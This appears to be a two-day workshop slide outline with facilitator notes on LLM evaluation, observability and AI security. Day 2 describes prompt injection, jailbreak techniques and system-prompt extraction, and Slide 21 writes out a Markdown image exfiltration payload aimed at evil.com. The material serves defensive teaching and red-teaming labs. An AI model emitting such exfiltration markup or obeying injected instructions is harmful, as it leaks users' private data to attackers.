# Slide Outlines & Facilitator Notes: Production AI Engineering

**Format:** 2 × 3.5-hour Half-Day Sessions  
**Stack:** Python 3.11+, Langfuse (OpenTelemetry), Promptfoo + `pytest`, Microsoft Presidio, Garak  
**Audience:** Software & AI Engineers building production LLM applications

---

## Day 1: AI Evals, Observability & Monitoring (3.5 Hours)

### Opening & Framing (5 min)
- **Slide 1: Title & Workshop Outcomes**
  - *Visual:* Two-day roadmap diagram (`Day 1: Measure & Observe` → `Day 2: Defend & Govern`).
  - *Bullets:* Stop vibe-checking prompts; build calibrated evals, full-stack traces, and CI regression gates.
  - *Facilitator Note:* Ask the room: *"How many of you have changed one sentence in a system prompt, eyeballed 3 outputs, shipped it, and later found out it broke a different workflow?"* Use the show of hands to anchor why this workshop exists.

---

### Unit 1.1: Why Traditional Testing Fails & Evaluation Foundations (40 min lecture + 35 min Lab 1)

- **Slide 2: Why `assert output == expected` Breaks for AI**
  - *Bullets:*
    - Stochastic outputs: same input, different valid phrasing.
    - Unbounded input space: users invent phrasing, languages, and edge cases you cannot enumerate.
    - Silent regressions: upstream model snapshots (`gpt-4o-2024-xx` / `gemini-*`), chunking tweaks, or prompt edits degrade quality without raising exceptions.
  - *Facilitator Note:* Emphasize that **unit tests still matter**—just not for semantic equivalence. Keep deterministic assertions for schemas, tool signatures, and latency/token budgets.

- **Slide 3: The AI Evaluation Pyramid**
  - *Visual:* 4-tier pyramid from bottom (fast/cheap) to top (slow/expensive):
    1. **Deterministic Code Checks** (`pydantic`, JSON schema, regex, tool-arg types, cost/latency caps)
    2. **Retrieval & Reference Metrics** (Recall@k, MRR, NDCG for RAG)
    3. **LLM-as-a-Judge** (semantic faithfulness, tone, policy adherence)
    4. **Human Review** (bootstrapping Golden Datasets & calibrating judges)
  - *Facilitator Note:* Common misconception: "We need LLM-as-a-Judge for everything." Push back: if a regex or Pydantic validator can catch it in 1ms for $0, never pay an LLM to grade it.

- **Slide 4: Failure Analysis First (Open & Axial Coding)**
  - *Bullets:*
    - Don't invent metrics in a vacuum—read 50–100 raw traces first.
    - **Open coding:** Write freeform notes on every bad trace (e.g., *"invented refund deadline"*, *"ignored negative constraint"*).
    - **Axial coding:** Cluster notes into 4–8 concrete failure modes; rank by `frequency × severity`.
    - Map each top failure mode to one focused Pass/Fail evaluator.
  - *Facilitator Note:* Engineers often want to jump straight to off-the-shelf 1–5 "helpfulness" scores. Explain why generic scores hide actionable bugs—domain-specific binary checks tell you *what* to fix.

- **Slide 5: Building a Golden Dataset**
  - *Bullets:*
    - Start with 30–100 high-signal rows, not 10,000 synthetic rows.
    - Sources: production thumbs-down logs, support escalations, edge-case taxonomy, adversarial seeds.
    - Stratify by intent, difficulty, and risk tier (low-stakes FAQ vs. state-mutating tool calls).
    - Version datasets in Git or Langfuse alongside prompts.
  - *Facilitator Note:* Remind participants that a Golden Dataset is a living test suite—every production bug should become a new row.

- **Slide 6: LLM-as-a-Judge: Design & Calibration**
  - *Bullets:*
    - Prefer **binary Pass/Fail** over 1–5 Likert scales.
    - Force **reasoning/critique before the verdict** in structured JSON output.
    - Known biases: *position bias* (A/B order), *verbosity bias* (longer = better), *self-preference*.
    - **Calibration rule:** Measure judge precision/recall against a human-labeled validation split before trusting it in CI.
  - *Facilitator Note:* Highlight a practical trick: use a stronger/different model family as the judge than the generator during calibration, then distill to a faster judge only if agreement holds.

- **Slide 7: Lab 1 Briefing — Failure Analysis & Calibrated Judge (35 min)**
  - *Bullets:* Inspect 20 RAG traces → identify top 3 failure modes → write deterministic check + binary Faithfulness judge → measure agreement on 20 held-out labeled traces.
  - *Facilitator Note:* Walk around at minute 15 to check that teams aren't writing vague judge prompts like *"Rate 1-5 if this is good."* Debrief for 5 min at the end on how adding a `reasoning` field before `verdict` improved precision.

---

### Break (15 min)

---

### Unit 1.2: Observability, Monitoring & Platform Landscape (35 min lecture + 25 min Lab 2)

- **Slide 8: Anatomy of an LLM Trace**
  - *Visual:* Span waterfall: `request` → `query_rewrite` → `vector_search` → `rerank` → `llm_generate` → `tool_call` → `final_response`.
  - *Bullets:*
    - Required attributes: `model`, `prompt_version`, `tokens_in/out/cached`, `TTFT`, `total_latency`, `cost_usd`, `retrieved_doc_ids`, `session_id`.
    - Why **OpenTelemetry (GenAI Semantic Conventions)** matters: instrument once, swap backends later.
  - *Facilitator Note:* Stress `prompt_version` and `commit_sha` on every trace. Without version tags, a spike in errors after a deploy is impossible to bisect.

- **Slide 9: Online Monitoring vs. Offline Evals**
  - *Bullets:*
    - **System Health:** TTFT, P95/P99 latency, token burn per tenant/feature, 429 rate-limits, fallback triggers.
    - **Behavioral Signals:** Re-prompting, copy/abandonment, explicit feedback, empty-retrieval rate, JSON parse failures.
    - **Drift Detection:** Input length shifts, topic/embedding drift, sudden refusal spikes after provider updates.
  - *Facilitator Note:* Ask: *"How many alerts do you have for HTTP 500s vs. alerts for 'the LLM returned valid 200 OK JSON that says I cannot help with that'?"*

- **Slide 10: Platform Landscape & Selection Matrix**
  - *Table/Bullets:*
    - **Open-Source / Self-Hostable:** *Langfuse* (tracing + prompt management + datasets + evals), *Arize Phoenix* (OTel-native, embedding/RAG inspection), *Opik* (experiments + tracing).
    - **Managed / Eval-First:** *Braintrust* (tight playground-to-CI loop), *LangSmith* (LangChain/LangGraph native), *Helicone* (lightweight proxy/gateway).
    - **Code-First CLI Runners:** *Promptfoo*, *DeepEval*, *Ragas* (fast local & CI execution).
  - *Facilitator Note:* Frame our workshop choice (**Langfuse + Promptfoo/pytest**): teams get full data-residency control with Langfuse and Git-native CI ergonomics with Promptfoo/pytest.

- **Slide 11: Lab 2 Briefing — Tracing & Bottleneck Diagnosis (25 min)**
  - *Bullets:* Instrument a 3-step Python RAG + tool script with Langfuse/OTel spans → attach `prompt_version` & user score → diagnose why P95 latency and token cost spiked.
  - *Facilitator Note:* Point out the planted bottleneck (sequential tool calls + bloated `k=20` retrieval context) during the 5-minute debrief.

---

### Unit 1.3: Production Eval Loops & CI/CD Integration (30 min lecture + 30 min Lab 3)

- **Slide 12: The Continuous Eval Flywheel**
  - *Visual:* Loop diagram: `Production Traffic` → `Online Scorers & User Feedback` → `Triage` → `Golden Dataset` → `CI/CD Gate` → `Canary Deploy`.
  - *Bullets:* Production failures become permanent regression tests; CI prevents shipping the same bug twice.
  - *Facilitator Note:* Emphasize ownership: engineers own the Golden Dataset just like they own unit tests—it is not "someone else's QA job."

- **Slide 13: CI/CD Gating Without Blowing Your Budget**
  - *Bullets:*
    - **PR Gate (<2 min):** Deterministic `pytest` checks + 25–50 high-signal smoke cases in `promptfoo` using a fast judge.
    - **Nightly / Pre-Release:** Full Golden Dataset (500+ rows), multi-turn simulations, and model-upgrade benchmarks.
    - **Variance Control:** Run paired comparisons (`baseline` vs. `candidate` on identical inputs) and require `pass@k` or confidence thresholds rather than reacting to 1-row flake.
  - *Facilitator Note:* Address the #1 objection: *"Running LLM evals in CI is too slow and expensive."* Show how tiering PR vs. Nightly keeps PR feedback under 2 minutes and pennies per run.

- **Slide 14: Safe Rollouts — Shadow, Canary & Rollback**
  - *Bullets:*
    - **Shadow mode:** Replay live traffic asynchronously against new prompt/model; score offline.
    - **Canary (5% traffic):** Automated rollback on JSON parse failures, guardrail triggers, or P95 latency regressions.
    - **Prompt Decoupling:** Store prompts versioned in Langfuse or config so emergency rollbacks don't require a full container rebuild.
  - *Facilitator Note:* Wrap up Day 1 by connecting observability to safety: tomorrow we'll look at what happens when the inputs aren't just noisy—they're adversarial.

- **Slide 15: Lab 3 Briefing — CI Regression Gate (30 min)**
  - *Bullets:* Compare `baseline` vs. `candidate` prompt with `promptfoo` + `pytest` → enforce `schema_validity == 100%` and `faithfulness >= 0.90` → catch the planted silent regression.
  - *Facilitator Note:* Show the final HTML/CLI diff report on the projector so everyone sees how a PR reviewer reads an eval failure.

---

## Day 2: AI Security & Safety (3.5 Hours)

### Opening & Day 1 Recap (5 min)
- **Slide 16: Day 2 Framing — From Reliability to Adversarial Resilience**
  - *Bullets:* Day 1 caught accidental regressions; Day 2 defends against intentional attacks, data leaks, and unsafe agent actions.
  - *Facilitator Note:* Connect the two days: every security failure discovered today becomes a new test case in Day 1's Golden Dataset.

---

### Unit 2.1: Understanding the AI Threat Surface (25 min lecture + 20 min Lab 4)

- **Slide 17: The Root Cause — Conflating Data and Instructions**
  - *Bullets:*
    - LLMs process system prompts, user input, RAG chunks, and tool outputs in **one shared token stream**.
    - No hardware-enforced privilege ring (unlike SQL parameterized queries or OS kernel/user space).
    - Any untrusted text entering the context window is a potential control-plane hijack.
  - *Facilitator Note:* Use the SQL injection analogy: before parameterized queries, concatenating strings mixed code and data. With LLMs, *everything* in the context window is still concatenated text—so defense must happen at the architecture and tool boundaries.

- **Slide 18: The 5 Trust Boundaries (OWASP LLM Top 10 Mapped)**
  - *Bullets:*
    1. **Input Boundary:** Direct prompt injection, jailbreaks, encoding smuggling.
    2. **Retrieval / RAG Boundary:** Indirect injection, corpus poisoning, cross-tenant ACL leaks.
    3. **Tool / Agentic Boundary:** Excessive agency, SSRF/SQLi via LLM args, confused-deputy actions.
    4. **Output Boundary:** Markdown/XSS injection, insecure output handling, slopsquatting.
    5. **Data & Supply Chain:** Logging leaks, malicious MCP servers/plugins, ZDR gaps.
  - *Facilitator Note:* Keep OWASP practical—tie each boundary to a concrete failure engineers recognize from web/backend security.

- **Slide 19: The "Lethal Trifecta" for AI Agents**
  - *Visual:* Venn diagram / triangle: `(1) Private Data Access` + `(2) Untrusted Content Exposure` + `(3) External Communication / State Mutation`.
  - *Bullets:*
    - All three together = silent data exfiltration risk.
    - Breaking *any* leg (e.g., removing arbitrary outbound URLs or requiring HITL confirmation for external writes) collapses the blast radius.
  - *Facilitator Note:* This is the single most memorable mental model for Day 2. Revisit it whenever someone proposes giving an autonomous agent email/Slack/HTTP write tools.

- **Slide 20: Lab 4 Briefing — Threat Modeling an Agentic App (20 min)**
  - *Bullets:* Given an architecture diagram (Slack bot + Confluence RAG + Jira/Email write tools), map trust boundaries and document 3 concrete attack paths ranked by `impact × likelihood`.
  - *Facilitator Note:* Pair engineers up for 12 minutes, then spend 8 minutes collecting the top attack paths on the whiteboard.

---

### Unit 2.2: Attacks, Hallucinations & Data Privacy / PII Protection (35 min lecture + 40 min Lab 5)

- **Slide 21: Prompt Injection & Output Exfiltration Patterns**
  - *Bullets:*
    - **Direct:** Persona framing, delimiter escaping, Base64/homoglyphs, multi-turn crescendo.
    - **Indirect:** Hidden text in HTML/PDFs, poisoned support tickets, malicious tool responses.
    - **System Prompt Extraction:** Never store API keys, DB strings, or secret business rules in system prompts.
    - **Zero-Click Exfiltration:** LLM renders `![x](https://evil.com/leak?data=SECRET)` in Markdown UI.
  - *Facilitator Note:* Live-demo or show a concrete Markdown image exfiltration example—engineers are consistently surprised that a read-only chatbot can exfiltrate data via a rendered image tag.

- **Slide 22: Hallucinations as a Security & Business Risk**
  - *Bullets:*
    - **Slopsquatting:** Attackers register frequently hallucinated PyPI/npm package names.
    - **Unauthorized Commitments:** Bots inventing discounts, SLAs, or legal terms.
    - **Mitigations:** Strict grounding, citation verification, `enum`/schema-constrained outputs, and deterministic business-rule checks *outside* the LLM.
  - *Facilitator Note:* Reinforce: never let the LLM be the final authority on pricing, permissions, or eligibility.

- **Slide 23: Data Privacy, PII & RAG Access Control**
  - *Bullets:*
    - **Pre-LLM Redaction (Microsoft Presidio):** Detect and mask PII/secrets (`<PERSON_1>`, `<EMAIL_1>`) *before* calling external model APIs; re-hydrate locally if needed.
    - **Observability Hygiene:** Scrub PII/tokens before sending spans to Langfuse/OTel; set retention TTLs.
    - **Vector DB ACLs:** Enforce tenant/user permissions as mandatory metadata filters *inside* the retrieval query—never in the system prompt.
    - **Vendor Controls:** Zero Data Retention (ZDR), no-training agreements, regional endpoints.
  - *Facilitator Note:* Emphasize the RAG ACL rule: *"If a document is in the prompt, it is already too late for access control."*

- **Slide 24: Lab 5 Briefing — Attack & Harden (40 min)**
  - *Bullets:*
    - *Part A (Attack, 15 min):* Trigger indirect injection via a poisoned doc + Markdown image exfiltration.
    - *Part B (Defend, 25 min):* Add Presidio PII redaction, enforce vector-DB tenant ACLs, sanitize Markdown links, and move auth checks into deterministic tool wrappers.
  - *Facilitator Note:* Keep Part A time-boxed to 15 min so everyone has plenty of time to implement the defenses in Part B.

---

### Break (15 min)

---

### Unit 2.3: Guardrails, Runtime Checks, Red Teaming & Governance (30 min lecture + 30 min Lab 6 + 15 min Wrap-up)

- **Slide 25: Defense-in-Depth Runtime Guardrails**
  - *Visual:* 4-stage pipeline: `Input Checks` → `Retrieval ACLs` → `Tool Policy & HITL` → `Output Checks`.
  - *Bullets:*
    - **Input:** Rate/length limits, fast injection classifiers (e.g., Llama Guard / Lakera Guard / heuristics), topic allowlists.
    - **Tool Execution:** Least-privilege scoped tokens, strict Pydantic arg validation, **Human-in-the-Loop (HITL)** for destructive/external writes.
    - **Output:** PII leak scan, toxicity/policy check, groundedness check.
    - **Latency Budget:** Run fast deterministic/small-model checks synchronously; run heavy checks async or on high-risk actions only.
  - *Facilitator Note:* Warn against stacking 5 synchronous LLM guardrail calls—users will abandon a 12-second chatbot.

- **Slide 26: Automated Red Teaming (`garak` & `promptfoo redteam`)**
  - *Bullets:*
    - Treat AI red teaming like automated fuzzing + pentesting.
    - Attack categories: jailbreaks, PII extraction, indirect injection, excessive agency, off-topic/brand manipulation.
    - Track **Attack Success Rate (ASR)** over time.
    - **Close the loop:** Every successful exploit → added to Day 1's Golden Dataset as a permanent CI test.
  - *Facilitator Note:* Show how `garak` probes broad model/system weaknesses while `promptfoo redteam` excels at app-specific, CI-integrated adversarial suites.

- **Slide 27: Governance & Production Readiness**
  - *Bullets:*
    - **Inventory & Data Flow:** Document models, ZDR status, data classification, and third-party MCP/tools.
    - **Incident Response:** Feature-flag kill switches for tools, instant prompt rollback, provider fallback, and safe degraded responses.
    - **Compliance & Audit:** Immutable logs of agentic tool calls; alignment with NIST AI RMF / EU AI Act risk tiers.
  - *Facilitator Note:* Ask teams: *"If your agent starts sending bad emails at 2 AM, how many seconds does it take to disable that tool without redeploying?"*

- **Slide 28: Lab 6 Briefing — Guardrails & Red Teaming (30 min)**
  - *Bullets:* Wire input injection check + HITL/policy gate on a mutating tool → run `promptfoo redteam` / `garak` scan → inspect ASR → promote 2 discovered exploits into `pytest`/CI regression tests.
  - *Facilitator Note:* In the final 15-minute wrap-up, walk through the **Production Readiness Checklist** in [curriculum.md](./curriculum.md) and ask each participant to name one gap in their current production system they will fix first.
